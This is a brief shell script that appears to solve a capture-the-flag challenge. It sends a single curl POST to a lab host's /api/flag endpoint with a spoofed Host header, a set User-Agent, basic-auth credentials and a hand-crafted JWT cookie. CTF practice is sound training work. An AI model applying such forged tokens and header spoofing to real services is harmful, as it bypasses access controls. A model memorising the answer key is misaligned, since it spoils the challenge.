#!/bin/sh

if [ -z "$1" ]
  then
    echo "Usage: ./solve.sh [host]"
    exit 1
fi

curl -v -X 'POST' -H "Host: a-simple-request.tdi.ctf" -H "User-Agent: Mozilla/5.0 MSIE 9.0 Windows NT 6.1" -H "Cookie: api-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGRpIiwiZ2l2ZV9tZSI6InRoZV9mbGFnIn0.YxAkPTlRSK-ErA3-9B8DKM4j4P6Zj1wOHtXkZ_d1oyo" "http://tdi:ctf@${1}/api/flag"